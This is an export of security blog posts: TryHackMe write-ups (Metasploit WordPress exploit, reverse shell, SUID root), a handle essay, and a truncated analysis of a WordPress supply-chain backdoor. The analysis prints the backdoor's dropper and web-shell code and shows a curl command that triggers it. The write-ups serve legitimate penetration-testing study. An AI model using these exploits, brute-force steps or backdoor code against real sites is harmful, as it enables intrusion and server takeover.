[ { "title": "Blog - TryHackMe", "url": "/posts/blog/", "categories": "tryhackme, writeup", "tags": "medium", "date": "2025-04-13 22:00:00 -0400", "snippet": "This medium-difficulty TryHackMe box creates a pretty realistic penetration testing scenario with a metasploitable web service, a SUID escalation, and a few rabbit holes to distract you. My favorit...", "content": "This medium-difficulty TryHackMe box creates a pretty realistic penetration testing scenario with a metasploitable web service, a SUID escalation, and a few rabbit holes to distract you. My favorite part was a brief disassembly exercise to determine the functionality of a mystery binary. Get your toolkit ready and follow along for a solution to Blog. Please note: To comply with TryHackMe’s write-up requirements, I’ve included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.Service EnumerationLet’s start our recon with nmap.sudo nmap -T4 -A blog.thmStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-12 22:08 EDTNmap scan report for blog.thm (10.10.180.177)Host is up (0.11s latency).Not shown: 996 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)| 256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)|_ 256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)80/tcp open http Apache httpd 2.4.29|_http-generator: WordPress 5.0|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog| http-robots.txt: 1 disallowed entry|_/wp-admin/|_http-server-header: Apache/2.4.29 (Ubuntu)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.94SVN%E=4%D=4/12%OT=22%CT=1%CU=36274%PV=Y%DS=4%DC=T%G=Y%TM=67FBOS:1CD2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=9)OS:SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M509ST11NW7%O2=M509SOS:T11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11NW7%O6=M509ST11)WIN(W1=OS:F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=OS:M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=SOS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=GOS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)Network Distance: 4 hopsService Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-time:| date: 2025-04-13T02:09:06|_ start_date: N/A|_nbstat: NetBIOS name: BLOG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 3:1:1:|_ Message signing enabled but not required| smb-os-discovery:| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: blog| NetBIOS computer name: BLOG\\x00| Domain name: \\x00| FQDN: blog|_ System time: 2025-04-13T02:09:06+00:00TRACEROUTE (using port 587/tcp)HOP RTT ADDRESS1 59.33 ms 10.6.0.12 ... 34 122.48 ms blog.thm (10.10.180.177)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 52.35 secondsWe have SSH, a web service, and some file shares to investigate. Pay close attention to the nmap scripts output for the web service. It will help you answer these task questions: What CMS was BIlly using? What version of the above CMS was being used?Blog EnumerationLet’s start with the blog. Loading the main page in a browser, we see a post from Billy Joel’s mom: Karen Wheeler.Our nmap scan identified the blog software as WordPress, so we can use the wpscan tool to probe for more information. I’ll save you some time here and just say that the default scan doesn’t provide anything useful. Our nmap scan did identify the WordPress version and if we check exploit-db.com we’ll find something that looks pretty promising.WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit) This module exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 and &lt;= 4.9.8. The crop-image function allows a user, with at least author privileges, to resize an image and perform a path traversal by changing the _wp_attached_file reference during the upload. The second part of the exploit will include this image in the current theme by changing the _wp_page_template attribute when creating a post. This exploit module only works for Unix-based systems currently.According to the exploit description, we’ll need a user with at least author privileges. Let’s compromise a user account! We can use wpscan again to enumerate users for us.wpscan --url http://blog.thm --enumerate u...[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 &lt;=======================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:01[i] User(s) Identified:[+] kwheel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] bjoel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] Karen Wheeler | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection)[+] Billy Joel | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection) ...Okay! We have two users: Billy, and his mom Karen. Let’s use wpscan again to brute-force a password.wpscan --url http://blog.thm --passwords /usr/share/wordlists/rockyou.txt --usernames 'bjoel,kwheel'...[SUCCESS] - kwheel / REDACTEDBilly used a strong password; but his mom didn’t. Good news! If you log into the admin panel with Karen’s account, you’ll find she has author privileges.ExploitationFire up Metasploit! We’re going to launch some exploits.msfconsoleThe exploit we want is called multi/http/wp_crop_rce.use multi/http/wp_crop_rceThe options you’ll want to set are USERNAME to kwheel, PASSWORD to Karen’s password, and RHOSTS to your target.set USERNAME kwheelset PASSWORD REDACTEDset RHOSTS blog.thm A few things to note here: I edit my /etc/hosts file so I can refer to my target by name. That lets me set my RHOSTS to blog.thm, but you can just specify the IP address. Note that the value for PASSWORD is redacted. You must substitute the brute-forced password here. Lastly, check your LHOST value. Mine defaults to my local network IP address which won’t allow the reverse shell to connect back. I set it using my TryHackMe VPN adapter name: set LHOST tun0Run it!run[*] Started reverse TCP handler on 10.6.30.85:4444[*] Authenticating with WordPress using kwheel:REDACTED...[+] Authenticated with WordPress[*] Preparing payload...[*] Uploading payload[+] Image uploaded[*] Including into theme[*] Sending stage (39927 bytes) to 10.10.80.143[*] Meterpreter session 1 opened (10.6.30.85:4444 -&gt; 10.10.80.143:51572) at 2022-12-24 15:10:39 -0500[*] Attempting to clean up files...meterpreter &gt;Post-ExploitationWe’re in! We have a PHP reverse shell into the target.meterpreter &gt; shellProcess 1840 created.Channel 1 created.dirhSteQAxeEn.php wp-blog-header.php wp-includes wp-signup.phpindex.php wp-comments-post.php wp-links-opml.php wp-trackback.phplicense.txt wp-config-sample.php wp-load.php xmlrpc.phpreadme.html wp-config.php wp-login.phpwp-activate.php wp-content wp-mail.phpwp-admin wp-cron.php wp-settings.phpwhoamiwww-datals /homebjoelcd /home/bjoells -altotal 100drwxr-xr-x 4 bjoel bjoel 4096 May 26 2020 .drwxr-xr-x 3 root root 4096 May 26 2020 ..lrwxrwxrwx 1 root root 9 May 26 2020 .bash_history -&gt; /dev/null-rw-r--r-- 1 bjoel bjoel 220 Apr 4 2018 .bash_logout-rw-r--r-- 1 bjoel bjoel 3771 Apr 4 2018 .bashrcdrwx------ 2 bjoel bjoel 4096 May 25 2020 .cachedrwx------ 3 bjoel bjoel 4096 May 25 2020 .gnupg-rw-r--r-- 1 bjoel bjoel 807 Apr 4 2018 .profile-rw-r--r-- 1 bjoel bjoel 0 May 25 2020 .sudo_as_admin_successful-rw-r--r-- 1 bjoel bjoel 69106 May 26 2020 Billy_Joel_Termination_May20-2020.pdf-rw-r--r-- 1 bjoel bjoel 57 May 26 2020 user.txtcat user.txtYou won't find what you're looking for here.TRY HARDERLooking around a bit, we discover we are the www-data user, there’s an OS user with the same name as the WordPress user for Billy: bjoel, and there’s a false user flag in his home directory.There are a few rabbit holes here, including the network shares we’ve ignored so far. Instead, we’re going to look for a privilege escalation. I like to use LinPEAS as it grabs a lot of information about the system I can dig through.After executing LinPEAS on the remote host and looking through the output, a couple of sections stuck out to me.╔══════════╣ Analyzing Wordpress Files (limit 70)-rw-r----- 1 www-data www-data 3279 May 28 2020 /var/www/wordpress/wp-config.phpdefine('DB_NAME', 'blog');define('DB_USER', 'wordpressuser');define('DB_PASSWORD', 'REDACTED');define('DB_HOST', 'localhost');We could get into the database and try to shell out from there, but we’d just be pivoting to whatever user is running the database. We’re currently trying to get root or bjoel access, so let’s keep looking.╔══════════╣ SUID - Check easy privesc, exploits and write perms╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid-rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd ---&gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)-rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp ---&gt; HP-UX_10.20-rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd-rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh-rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newuidmap-rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec ---&gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034-rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn ---&gt; SuSE_9.3/10-rwsr-xr-x 1 root root 146K Jan 31 2020 /usr/bin/sudo ---&gt; check_if_the_sudo_version_is_vulnerable-rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at ---&gt; RTru64_UNIX_4.0g(CVE-2002-1614)-rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newgidmap-rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils-rwsr-sr-x 1 root root 8.3K May 26 2020 /usr/sbin/checker (Unknown SUID binary!)-rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic-rwsr-xr-- 1 root messagebus 42K Jun 10 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-sr-x 1 root root 107K Oct 30 2019 /usr/lib/snapd/snap-confine ---&gt; Ubuntu_snapd&lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)-rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1-rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-x 1 root root 43K Mar 5 2020 /bin/mount ---&gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8-rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount-rwsr-xr-x 1 root root 27K Mar 5 2020 /bin/umount ---&gt; BSD/Linux(08-1996)-rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping-rwsr-xr-x 1 root root 44K Mar 22 2019 /bin/su-rwsr-xr-x 1 root root 40K Oct 10 2019 /snap/core/8268/bin/mount ---&gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8-rwsr-xr-x 1 root root 44K May 7 2014 /snap/core/8268/bin/ping-rwsr-xr-x 1 root root 44K May 7 2014 /snap/core/8268/bin/ping6-rwsr-xr-x 1 root root 40K Mar 25 2019 /snap/core/8268/bin/su-rwsr-xr-x 1 root root 27K Oct 10 2019 /snap/core/8268/bin/umount ---&gt; BSD/Linux(08-1996)-rwsr-xr-x 1 root root 71K Mar 25 2019 /snap/core/8268/usr/bin/chfn ---&gt; SuSE_9.3/10-rwsr-xr-x 1 root root 40K Mar 25 2019 /snap/core/8268/usr/bin/chsh-rwsr-xr-x 1 root root 74K Mar 25 2019 /snap/core/8268/usr/bin/gpasswd-rwsr-xr-x 1 root root 39K Mar 25 2019 /snap/core/8268/usr/bin/newgrp ---&gt; HP-UX_10.20-rwsr-xr-x 1 root root 53K Mar 25 2019 /snap/core/8268/usr/bin/passwd ---&gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)-rwsr-xr-x 1 root root 134K Oct 11 2019 /snap/core/8268/usr/bin/sudo ---&gt; check_if_the_sudo_version_is_vulnerable-rwsr-xr-- 1 root systemd-resolve 42K Jun 10 2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 419K Mar 4 2019 /snap/core/8268/usr/lib/openssh/ssh-keysign-rwsr-sr-x 1 root root 105K Dec 6 2019 /snap/core/8268/usr/lib/snapd/snap-confine ---&gt; Ubuntu_snapd&lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)-rwsr-xr-- 1 root dip 386K Jun 12 2018 /snap/core/8268/usr/sbin/pppd ---&gt; Apple_Mac_OSX_10.4.8(05-2007)-rwsr-xr-x 1 root root 40K Jan 27 2020 /snap/core/9066/bin/mount ---&gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8-rwsr-xr-x 1 root root 44K May 7 2014 /snap/core/9066/bin/ping-rwsr-xr-x 1 root root 44K May 7 2014 /snap/core/9066/bin/ping6-rwsr-xr-x 1 root root 40K Mar 25 2019 /snap/core/9066/bin/su-rwsr-xr-x 1 root root 27K Jan 27 2020 /snap/core/9066/bin/umount ---&gt; BSD/Linux(08-1996)-rwsr-xr-x 1 root root 71K Mar 25 2019 /snap/core/9066/usr/bin/chfn ---&gt; SuSE_9.3/10-rwsr-xr-x 1 root root 40K Mar 25 2019 /snap/core/9066/usr/bin/chsh-rwsr-xr-x 1 root root 74K Mar 25 2019 /snap/core/9066/usr/bin/gpasswd-rwsr-xr-x 1 root root 39K Mar 25 2019 /snap/core/9066/usr/bin/newgrp ---&gt; HP-UX_10.20-rwsr-xr-x 1 root root 53K Mar 25 2019 /snap/core/9066/usr/bin/passwd ---&gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)-rwsr-xr-x 1 root root 134K Jan 31 2020 /snap/core/9066/usr/bin/sudo ---&gt; check_if_the_sudo_version_is_vulnerable-rwsr-xr-- 1 root systemd-resolve 42K Nov 29 2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 419K Mar 4 2019 /snap/core/9066/usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 109K Apr 10 2020 /snap/core/9066/usr/lib/snapd/snap-confine ---&gt; Ubuntu_snapd&lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)-rwsr-xr-- 1 root dip 386K Feb 11 2020 /snap/core/9066/usr/sbin/pppd ---&gt; Apple_Mac_OSX_10.4.8(05-2007)Did you catch the oddity in this section?-rwsr-sr-x 1 root root 8.3K May 26 2020 /usr/sbin/checker (Unknown SUID binary!)Privilege EscalationIf you run it directly from your shell, it prints the message: “Not an Admin”. Weird. What the hell is this thing? Let’s pull it down to our attack box and examine it. You can do this from the Meterpreter command line (not your shell).download /usr/sbin/checker .Use your tool of choice for disassembly. I used Ghidra and it translated the assembly to this C code.undefined8 main(void){ char *pcVar1; pcVar1 = getenv(\"admin\"); if (pcVar1 == (char *)0x0) { puts(\"Not an Admin\"); } else { setuid(0); system(\"/bin/bash\"); } return 0;}Pretty simple. This checker binary examines the admin environment variable. If it’s empty, it prints “Not an Admin”. Otherwise, it makes you root and starts a new bash shell. Let’s test it! Back in your reverse shell, set an environment variable named admin to any value.export admin=1Then run checker./usr/sbin/checkerwhoamirootExcellent. Now all that’s left is to collect our flags.cat /root/root.txtREDACTEDBut where was the real user flag? If you ventured down one of the rabbit holes, you’d learn that Billy got fired for repeated offenses regarding the company removable media policy. Use the find command as root to locate and collect the last flag; and answer the remaining task question “Where was user.txt found?”.find / -name user.txt 2&gt;/dev/null" }, { "title": "Anthem - TryHackMe", "url": "/posts/anthem/", "categories": "tryhackme, writeup", "tags": "easy", "date": "2025-04-07 21:41:38 -0400", "snippet": "I completed another easy room today on TryHackMe trying to work myself into a new habit of doing write-ups regularly. Anthem is a great box for beginners because the only tool you need is nmap. All...", "content": "I completed another easy room today on TryHackMe trying to work myself into a new habit of doing write-ups regularly. Anthem is a great box for beginners because the only tool you need is nmap. All of the flags are discoverable using recon. Here we go! Please note: To comply with TryHackMe’s write-up requirements, I’ve included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.Task 1 - Website AnalysisThe questions for this task will guide you through all of the recon you need to complete the room. I’m going to intentionally skip over the flags you may come across and save them for the next section. I won’t explicitly give you the answers to each question, but at the end of each subsection I’ll include a checklist of the questions and which ones have been answered by the recon we’ve done so far.Network Services ReconThe first question reads “Let’s run nmap and check what ports are open.”, so let’s do that now.$ sudo nmap -Pn -T4 -A anthemStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 20:05 EDTNmap scan report for anthem (10.10.21.18)Host is up (0.11s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| http-robots.txt: 4 disallowed entries|_/bin/ /config/ /umbraco/ /umbraco_client/|_http-title: Anthem.com - Welcome to our blog3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info:| Target_Name: WIN-LU09299160F| NetBIOS_Domain_Name: WIN-LU09299160F| NetBIOS_Computer_Name: WIN-LU09299160F| DNS_Domain_Name: WIN-LU09299160F| DNS_Computer_Name: WIN-LU09299160F| Product_Version: 10.0.17763|_ System_Time: 2025-04-08T00:05:45+00:00|_ssl-date: 2025-04-08T00:05:53+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=WIN-LU09299160F| Not valid before: 2025-04-06T23:41:07|_Not valid after: 2025-10-06T23:41:07Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portOS fingerprint not ideal because: Missing a closed TCP port so results incompleteNo OS matches for hostNetwork Distance: 4 hopsService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsTRACEROUTE (using port 3389/tcp)HOP RTT ADDRESS1 46.83 ms 10.6.0.12 ... 34 113.95 ms anthem (10.10.21.18)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 35.88 secondsThe nmap output also provides answers to the next two questions as well. Let’s run namp and check what ports are open. What port is for the web server? What port is for remote desktop service? What is a possible password in one of the pages web crawlers check for? What CMS is the website using? What is the domain of the website? What’s the name of the Administrator Can we find find the email address of the administrator? Web Service ReconThe next few questions are specific to the web service we discovered. At this point, when I discover a web service I like to use my browser to look around.It’s serving a simple blog application with a couple of posts and authors. Finding the domains is pretty easy because the site creators have it as the title of the blog.One of the first things I like to manually check is the existence of a robots.txt file. There is often valuable site information here that saves time running a discovery tool. The options I used when we ran nmap actually detected this file and gave us some of the information already.80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| http-robots.txt: 4 disallowed entries|_/bin/ /config/ /umbraco/ /umbraco_client/|_http-title: Anthem.com - Welcome to our blogThere are four entries the site would like to prevent bots from crawling. If we search Google for “umbraco”, it’s pretty plain that the this is the software being used to power the blog. If we visit the robots document directly in our browser, there appears to be some extra data there as well.REDACTED# Use for all search robotsUser-agent: *# Define the directories not to crawlDisallow: /bin/Disallow: /config/Disallow: /umbraco/Disallow: /umbraco_client/That should provide enough recon data to answer three more questions. Let’s run namp and check what ports are open. What port is for the web server? What port is for remote desktop service? What is a possible password in one of the pages web crawlers check for? What CMS is the website using? What is the domain of the website? What’s the name of the Administrator Can we find find the email address of the administrator? Blog User ReconThe remaining two questions are a bit trickier and we’ll have to examine the blog for clues. Clicking through the posts, you’ll find one called “A cheers to our IT department”. This post was written by a “James Orchard Halliwell” and it contains a poem. If we Google the phrases, we learn that the name of the poem is also the name of a person. This seems like a pretty good possibility for the name of our administrator.Next, we’ll need to see if we can figure out the email address of the administrator. Another post on the blog entitled “We are hiring” has an author of “Jane Doe”. Jane’s email (unlike James’) is listed as JD@anthem.com. It looks like the site uses a user’s initials for their username. We can confirm that we’ve successfully guessed the administrator’s email and found their password in the robots.txt file by using the login page on the /umbraco/ path. Let’s run namp and check what ports are open. What port is for the web server? What port is for remote desktop service? What is a possible password in one of the pages web crawlers check for? What CMS is the website using? What is the domain of the website? What’s the name of the Administrator Can we find find the email address of the administrator? Task 2 - Spot the flagsYou probably spotted at least one flag so far. The others are hidden in the page sources. We’ll cover each one below along with the hints that point you to them.Flag 1 Hint: Have we inspected the pages yet?The first flag is hidden in a meta tag on the “We are hiring” post page.http://anthem/archive/we-are-hiring/Flag 2 Hint: Search for itThe second flag is hidden in the placeholder text of the search field (on all pages). It stretches out of the viewable area, but can still be seen in the page source.Flag 3 Hint: ProfileThe third flag is the easiest to spot during recon. It’s displayed on Jane Doe’s author page.http://anthem/authors/jane-doe/Flag 4 Hint: Have we inspected all the pages yet?The fourth and final flag is hidden in a meta tag on the “A cheers to our IT department” post page.http://anthem/archive/a-cheers-to-our-it-department/Task 3 - Final stageNow that we’ve gathered enough information about our target, we can try and log in. If you remember the output from our initial nmap scan, the remote desktop port is open. Using the administrator’s username (just their initials) and the password we found, we are able to successfully remote into the machine.The user.txt file is right there on the desktop and contains the user flag. The next task question “Can we spot the admin password?” tells us that we’re probably going to escalate our privileges by loggin in as the Administrator account, we just need to find the password. The hint reads “It is hidden.”, so there’s probably a hidden file somewhere.Let’s reconfigure Windows Explorer’s view options. You can do this by opening an Explorer window and clicking View &gt; Options. On the dialog that pops up, change the “Hidden files and folders” radio button to select “Show hidden files, folders, and drives”.Now we can go hunting for hidden files and folders. Luckily we don’t have to look far. Right under the root of the C drive, there’s a hidden folder called “backup”.Inside, there’s a file called restore.txt but we can’t open it. If we examine the file properties we can see the current user owns it, there just aren’t any permissions assigned. We can add “Full control” permissions for the current user using the “Security” tab in the file properties dialog.Now we can open the file and we’ve discovered the Administrator password.If we kill our RDP session and log back in with the user “Administrator” and the password we just found, we get admin access. The final root flag is on the desktop in a file called root.txt." }, { "title": "My Hacker Handle", "url": "/posts/dnstun0/", "categories": "", "tags": "", "date": "2024-10-17 21:06:00 -0400", "snippet": "Anyone who’s participated in an online community is familiar with the initiation ritual of choosing a handle. You know, that pseudonym everyone in the community will come to know you as. Some, whet...", "content": "Anyone who’s participated in an online community is familiar with the initiation ritual of choosing a handle. You know, that pseudonym everyone in the community will come to know you as. Some, whether by choice or ignorance, choose their given name (johnsmith). Others choose their favorite sports team (eaglesfan78), animal (reddragon), or character from their preferred media platform (picklerick). And some, use no imagination at all (user187384). Hacker handles tend to be leetspeak or technical jargon and mine is no exception. Before we get to that though, let me provide a little context.Many years ago, I was browsing Slashdot (as one did before Reddit became a smash hit) and I came across this article on abusing DNS to surf the internet for free. This was one of the first “hacking” articles I’d ever read that struck me as absolutely brilliant.To quickly summarize: the author describes how IP traffic can be tunneled over DNS. Microsoft (at the time) provided toll-free PPP dialin numbers which, once you’re connected, have DNS servers available. You could then just tunnel your traffic through those servers for free internet. It obviously required a pre-configured remote DNS server to extract the payload data and act as a proxy.This combination of wrapping network traffic in a commonly used protocol so it tricks the service into sending and receiving data for you, bypassing an internet gateway, and getting to surf the internet for free; profoundly struck me. It’s been 24 years and I still think of this article on occasion. For these reasons, I chose to embody that awe in a hacker handle for myself: dnstun0. If you’re unfamiliar with Linux networking, it may be a little cryptic. The first half, DNS, is obviously the DNS protocol. The second half, tun0, is the network interface name given to a tunneling interface on Linux. Therefore “dnstun0” describes a network interface tunnel over DNS.Putting a little bit of effort into choosing a handle can be a satisfying act of self-expression. I chose to use mine as an homage to hacking ingenuity and breaking the rules." }, { "title": "Reversing a WordPress Backdoor", "url": "/posts/wordpress-backdoor/", "categories": "", "tags": "", "date": "2022-02-01 17:00:00 -0500", "snippet": "On January 18th, 2022, Jetpack published their discovery of a supply chain attack affecting 93 WordPress themes and plugins. An organization called AccessPress Themes had been breached in the first...", "content": "On January 18th, 2022, Jetpack published their discovery of a supply chain attack affecting 93 WordPress themes and plugins. An organization called AccessPress Themes had been breached in the first half of September 2021, and the extensions available for download on their site were injected with a backdoor.There are published YARA rules and other detection instructions readily available for site owners to determine if they are vulnerable. But if you’re a bug bounty hunter, penetration tester, or red teamer there’s not much information on how to test for and exploit the backdoor. The rest of this article will cover how to reverse engineer the backdoor and use it to obtain a web shell on a vulnerable host.DropperFirst, we’ll take a look at the dropper. The compromised extensions were modified to include a dropper function in the initial.php file of the main plugin or theme directory. When run, it installs a web shell in wp-includes/vars.php.01 function makeInit() {02 $b64 = 'ba' . 'se64' . '_dec' . 'ode';03 $b = 'ZnVuY3Rpb2........TsKCg==';0405 $f = $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/vars.php';06 if(file_exists($f)) {07 $fp = 0777 &amp; @fileperms($f);08 $ft = @filemtime($f);09 $fc = @file_get_contents($f);10 if(strpos($fc, 'wp_is_mobile_fix') === false) {11 $fc = str_replace('function wp_is_mobile()',12 $b64($b) . 'function wp_is_mobile()',13 $fc);14 @file_put_contents($f, $fc);15 @touch($f, $ft);16 @chmod($f, $fp);17 }18 return true;19 }20 return false;21 }Line two shows fragments of the base64_decode function name being concatenated together; probably to obfuscate its intent from any scanners. The actual web shell code is on line three, and is base64 encoded. The rest of the dropper checks for the existence of the vars.php file, sets its permissions wide open, inserts the backdoor, and then puts the file timestamp and permissions back the way they were.Backdoor Web ShellWhat did that dropper install? Decoding the base64 string reveals the following PHP code.01 function wp_is_mobile_fix() {02 $is_wp_mobile = ($_SERVER['HTTP_USER_AGENT'] == 'wp_is_mobile');03 $g = $_COOKIE;0405 (count($g) == 8 &amp;&amp; $is_wp_mobile) ?06 (($qr = $g[33].$g[32]) &amp;&amp; ($iv = $qr($g[78].$g[18])) &amp;&amp;07 ($_iv = $qr($g[12].$g[17])) &amp;&amp; ($_iv = @$iv($g[10], $_iv($qr($g[53])))) &amp;&amp; 08 @$_iv()) : $g;0910 return $is_wp_mobile;11 }1213 wp_is_mobile_fix();A quick glance tells us that using the backdoor will require a user agent string of wp_is_mobile and a cookie with eight values. Our final curl command will look something like this:$ curl -v -A \"wp_is_mobile\" --cookie \"33=; 32=; 78=; 18=; 12=; 17=; 10=; 53=\" http://localhost/wp-includes/vars.phpNow comes the challenging part: de-obfuscating that mess on lines five through eight and filling in the cookie values.Reverse Engineering the Web ShellThat question mark is a ternary operator; which is essentially a shortened if-else statement. If we re-examine and rewrite it as pseudo-code it makes things a little easier to understand: IF there are eight cookie values AND the user agent is an expected valueTHEN perform a series of statements and return their valueELSE return the cookie arraySince the result of this statement isn’t being stored or used, whatever the return value is doesn’t matter; and since the “else” just returns the cookie array, we can completely ignore that part of the statement. That leaves us with the comparison and the true condition. As mentioned before, to execute the series of statements we need eight cookie values and a user agent string of wp_is_mobile. That will cause the chain of statements in the true condition to execute. Let’s examine those now.(($qr = $g[33].$g[32]) &amp;&amp; ($iv = $qr($g[78].$g[18])) &amp;&amp; ($_iv = $qr($g[12].$g[17])) &amp;&amp; ($_iv = @$iv($g[10], $_iv($qr($g[53])))) &amp;&amp; @$_iv())As you can see, there are several statements chained together with double ampersands. This is a short-circuit evaluation, which means each statement will execute in sequence until one fails. This is an easy way to perform multiple actions in a single statement. To improve readability, we’ll rewrite these as separate statements.$qr = $g[33].$g[32];$iv = $qr($g[78].$g[18]);$_iv = $qr($g[12].$g[17]);$_iv = @$iv($g[10], $_iv($qr($g[53])));@$_iv();We can further reduce the complexity by removing some more of the obfuscation. The shell seems to be avoiding possible WAF rules by splitting its input across pairs of parameters that are then concatenated back together. Let’s remove half of each pair and assume we’ll be passing an empty string for the removed half. (e.g. \"str\".\"ing\" becomes \"string\".\"\")01 $qr = $g[33];02 $iv = $qr($g[78]);03 $_iv = $qr($g[12]);04 $_iv = @$iv($g[10], $_iv($qr($g[53])));05 @$_iv();We’ve now reduced the code to a point where we need to start interpreting the logic. It appears that the cookie values are being used to construct function name strings. PHP allows you to use a variable as a function name, and when followed by parentheses and arguments, will attempt to look up the function and execute it. That’s exactly what this code is doing; we just need to guess what functions are being called to create a web shell.The logic here is a bit tricky to describe, so here goes nothing. First, a function name is read from the cookie into qr. That function is then used to generate another function name from a cookie value and store it in iv. We do this again a third time with a different cookie value and store the result in _iv. Finally, we use the 